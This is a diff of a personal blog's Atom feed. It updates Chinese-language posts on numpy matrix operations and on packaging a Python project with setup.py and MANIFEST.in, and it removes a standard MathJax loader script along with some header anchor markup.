 &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id="orthogonal-matrix"&gt;&lt;a name="user-content-orthogonal-matrix" href="#orthogonal-matrix" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;随机生成正交矩阵（orthogonal matrix）&lt;/h3&gt;
+&lt;h3&gt;随机生成正交矩阵（orthogonal matrix）&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_orthogonal_matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
 &lt;span class="sd"&gt;    with random permutation of coordinate axes&lt;/span&gt;
@@ -627,72 +965,18 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id="eigen-decomposition"&gt;&lt;a name="user-content-eigen-decomposition" href="#eigen-decomposition" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;特征分解（eigen decomposition）&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;np.eigh&lt;/code&gt; 针对对称的矩阵， &lt;strong&gt;注意， eigenvalues 是升序的，而在R语言里面是降序的！&lt;/strong&gt;&lt;br /&gt;
-&lt;code&gt;np.eig&lt;/code&gt; 普通的分解， eigenvalues不保证顺序。  &lt;/p&gt;
-&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
-    var align = "left",
-        indent = "0em",
-        linebreak = "false";
-
-    if (true) {
-        align = (screen.width &lt; 768) ? "left" : align;
-        indent = (screen.width &lt; 768) ? "0em" : indent;
-        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
-    }
-
-    var mathjaxscript = document.createElement('script');
-    var location_protocol = (false) ? 'https' : document.location.protocol;
-    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
-    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
-    mathjaxscript.type = 'text/javascript';
-    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
-    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
-        "MathJax.Hub.Config({" +
-        "    config: ['MMLorHTML.js']," +
-        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
-        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
-        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
-        "    displayAlign: '"+ align +"'," +
-        "    displayIndent: '"+ indent +"'," +
-        "    showMathMenu: true," +
-        "    messageStyle: 'normal'," +
-        "    tex2jax: { " +
-        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
-        "        displayMath: [ ['$$','$$'] ]," +
-        "        processEscapes: true," +
-        "        preview: 'TeX'," +
-        "    }, " +
-        "    'HTML-CSS': { " +
-        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
-        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
-        "    }, " +
-        "}); " +
-        "if ('default' !== 'default') {" +
-            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
-                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
-                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
-                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
-                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
-                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
-            "});" +
-            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
-                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
-                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
-                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
-                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
-                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
-            "});" +
-        "}";
-    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
-}
-&lt;/script&gt;</summary><category term="numpy"></category><category term="python"></category><category term="小结"></category></entry><entry><title>Python Package Setup</title><link href="http://littlezz.github.io/python-package-setup.html" rel="alternate"></link><updated>2016-03-17T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-17:python-package-setup.html</id><summary type="html">&lt;p&gt;esl_model &lt;a href="https://github.com/littlezz/ESL-Model"&gt;https://github.com/littlezz/ESL-Model&lt;/a&gt;&lt;br /&gt;
-今天算是弄完了第三章的代码， 放到github上面， 折腾python的打包折腾了大半天。  &lt;/p&gt;
-&lt;p&gt;简单总结一下Python的Package Distribution吧。&lt;br /&gt;
+&lt;h3&gt;特征分解（eigen decomposition）&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;np.eigh&lt;/code&gt; 针对对称的矩阵， &lt;strong&gt;注意， eigenvalues 是升序的，而在R语言里面是降序的！&lt;/strong&gt;&lt;br&gt;
+&lt;code&gt;np.eig&lt;/code&gt; 普通的分解， eigenvalues不保证顺序。&lt;br&gt;
+&lt;/p&gt;</content><category term="numpy"></category><category term="python"></category><category term="小结"></category></entry><entry><title>Python Package Setup</title><link href="http://littlezz.github.io/python-package-setup.html" rel="alternate"></link><published>2016-03-17T00:00:00+08:00</published><updated>2016-03-17T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-17:/python-package-setup.html</id><summary type="html">&lt;p&gt;esl_model &lt;a href="https://github.com/littlezz/ESL-Model"&gt;https://github.com/littlezz/ESL-Model&lt;/a&gt;&lt;br&gt;
+今天算是弄完了第三章的代码， 放到github上面， 折腾python的打包折腾了大半天。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;简单总结一下Python的Package Distribution吧。&lt;br&gt;
 有空的话， 在写一个pytest的简单总结。&lt;/p&gt;
-&lt;h2 id="setuppy"&gt;&lt;a name="user-content-setuppy" href="#setuppy" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;setup.py&lt;/h2&gt;
+&lt;h2&gt;setup.py&lt;/h2&gt;
 &lt;p&gt;setup.py 是最主要的整个配置的文件， &lt;/p&gt;
-&lt;p&gt;贴我的setup.py 的代码好了。  &lt;/p&gt;
+&lt;p&gt;贴我的setup.py 的代码好了。&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;find_packages&lt;/span&gt;
 
 &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;README.rst&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
@@ -700,6 +984,32 @@ matrix是二维以上的。  &lt;/p&gt;
 
 &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;esl_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__version__&lt;/span&gt;
 
+&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;esl_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Algorithm from The Elements of Statistical Learning book implement by Python code&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;long_description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;readme&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;classifiers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
+          &lt;span class="s1"&gt;&amp;#39;Programming Language :: Python :: 3.5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+          &lt;span class="s1"&gt;&amp;#39;Programming Language :: Python :: 3 :: Only&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+          &lt;span class="s1"&gt;&amp;#39;Development Status :: 2 - Pre-Alpha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+          &lt;span class="s1"&gt;&amp;#39;License :: OSI Approved :: MIT License&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+      &lt;span class="p"&gt;],&lt;/span&gt;
+      &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;https://github.com/littlezz/ESL-Model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;author&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;littlezz …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;esl_model &lt;a href="https://github.com/littlezz/ESL-Model"&gt;https://github.com/littlezz/ESL-Model&lt;/a&gt;&lt;br&gt;
+今天算是弄完了第三章的代码， 放到github上面， 折腾python的打包折腾了大半天。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;简单总结一下Python的Package Distribution吧。&lt;br&gt;
+有空的话， 在写一个pytest的简单总结。&lt;/p&gt;
+&lt;h2&gt;setup.py&lt;/h2&gt;
+&lt;p&gt;setup.py 是最主要的整个配置的文件， &lt;/p&gt;
+&lt;p&gt;贴我的setup.py 的代码好了。&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;find_packages&lt;/span&gt;
+
+&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;README.rst&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;readme&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;esl_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__version__&lt;/span&gt;
 
 &lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;esl_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
       &lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
@@ -729,16 +1039,24 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;逐个解释参数。&lt;br /&gt;
-&lt;code&gt;name&lt;/code&gt; 是你要发布的模块的名字, 只能是用小写和下划线.不要和其他的公共的模块名字冲突.  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;version&lt;/code&gt; 是版本号, 诸如 0.0.1 这样.  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;description&lt;/code&gt; 和 &lt;code&gt;long_description&lt;/code&gt;是你这个项目的介绍，用于pipy上面的介绍，注意 long_description 只能使用rst格式， **不支持**markdown。   &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;classifiers&lt;/code&gt;是你在pipy上面的分类， 一般在这里要只能你是否支持py2， 或py3， 或者是否有特定的平台限制。&lt;a href="https://pypi.python.org/pypi?%3Aaction=list_classifiers"&gt;所有classifiers 列表&lt;/a&gt;  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;packages&lt;/code&gt;, 要包含的代码的文件夹。比如我也可以设置成 &lt;code&gt;esl_model&lt;/code&gt;， 但是据我观察， 这样设置之后， 我下面的子模块是没有办法使用&lt;code&gt;import esl_model.ch3&lt;/code&gt; 这样载入的。&lt;br /&gt;
-所以使用find_packages自动寻找所有模块， 特别排除我的测试文件存放的文件夹。  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;install_requires&lt;/code&gt;, 依赖， 如果在虚拟环境里面的话可以用&lt;code&gt;pip freeze&lt;/code&gt;来查看安装的库， 但是这里面会包含真正用到的库（比如里面可能会显示ipython）。 可以使用 pipreqs 这个库。  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;tests_require&lt;/code&gt; 这个是测试的用的, 在&lt;code&gt;python setup.py test&lt;/code&gt;的时候用到, 然而我偷懒了, pytest在这里还差一步配置， 所以这里有没有都一样。。  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;include_package_data&lt;/code&gt;, 这个是包含非python代码的文件， 我的程序里面要使用到csv数据， 所以需要这个选项。  &lt;/p&gt;
+&lt;p&gt;逐个解释参数。&lt;br&gt;
+&lt;code&gt;name&lt;/code&gt; 是你要发布的模块的名字, 只能是用小写和下划线.不要和其他的公共的模块名字冲突.&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;version&lt;/code&gt; 是版本号, 诸如 0.0.1 这样.&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;description&lt;/code&gt; 和 &lt;code&gt;long_description&lt;/code&gt;是你这个项目的介绍，用于pipy上面的介绍，注意 long_description 只能使用rst格式， &lt;strong&gt;不支持&lt;/strong&gt;markdown。 &lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;classifiers&lt;/code&gt;是你在pipy上面的分类， 一般在这里要只能你是否支持py2， 或py3， 或者是否有特定的平台限制。&lt;a href="https://pypi.python.org/pypi?%3Aaction=list_classifiers"&gt;所有classifiers 列表&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;packages&lt;/code&gt;, 要包含的代码的文件夹。比如我也可以设置成 &lt;code&gt;esl_model&lt;/code&gt;， 但是据我观察， 这样设置之后， 我下面的子模块是没有办法使用&lt;code&gt;import esl_model.ch3&lt;/code&gt; 这样载入的。&lt;br&gt;
+所以使用find_packages自动寻找所有模块， 特别排除我的测试文件存放的文件夹。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;install_requires&lt;/code&gt;, 依赖， 如果在虚拟环境里面的话可以用&lt;code&gt;pip freeze&lt;/code&gt;来查看安装的库， 但是这里面会包含真正用到的库（比如里面可能会显示ipython）。 可以使用 pipreqs 这个库。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tests_require&lt;/code&gt; 这个是测试的用的, 在&lt;code&gt;python setup.py test&lt;/code&gt;的时候用到, 然而我偷懒了, pytest在这里还差一步配置， 所以这里有没有都一样。。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;include_package_data&lt;/code&gt;, 这个是包含非python代码的文件， 我的程序里面要使用到csv数据， 所以需要这个选项。&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;我的代码结构树&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;── LICENSE.md
 ├── MANIFEST.in
@@ -768,21 +1086,26 @@ matrix是二维以上的。  &lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2 id="manifestin"&gt;&lt;a name="user-content-manifestin" href="#manifestin" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;MANIFEST.in&lt;/h2&gt;
-&lt;p&gt;指定需要包含的非程序文件  &lt;/p&gt;
-&lt;p&gt;一般是&lt;code&gt;include README.rst&lt;/code&gt; &lt;br /&gt;
-我这里因为有额外的数据， 所以要多一行。  &lt;/p&gt;
+&lt;h2&gt;MANIFEST.in&lt;/h2&gt;
+&lt;p&gt;指定需要包含的非程序文件&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;一般是&lt;code&gt;include README.rst&lt;/code&gt; &lt;br&gt;
+我这里因为有额外的数据， 所以要多一行。&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;include README.rst
 recursive-include esl_model/datasets/data *.csv
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;recursive-include 必须， 不然数据不包含。  &lt;/p&gt;
-&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;测试安装&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;pip install -e .&lt;/code&gt;&lt;br /&gt;
-本地的调试安装模式。  &lt;/p&gt;
-&lt;h2 id="ref"&gt;&lt;a name="user-content-ref" href="#ref" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;ref&lt;/h2&gt;
+&lt;p&gt;recursive-include 必须， 不然数据不包含。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;测试安装&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;pip install -e .&lt;/code&gt;&lt;br&gt;
+本地的调试安装模式。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;ref&lt;/h2&gt;
 &lt;ul&gt;
-&lt;li&gt;sklearn的配置文件 &lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;https://github.com/scikit-learn/scikit-learn&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;sklearn的配置文件 &lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;https://github.com/scikit-learn/scikit-learn&lt;/a&gt;&lt;br&gt;
+&lt;/li&gt;
 &lt;li&gt;Python-packaging &lt;a href="https://python-packaging.readthedocs.org/en/latest/testing.html"&gt;https://python-packaging.readthedocs.org/en/latest/testing.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</summary><category term="python"></category><category term="小结"></category></entry></feed>
+&lt;/ul&gt;</content><category term="python"></category><category term="小结"></category></entry></feed>
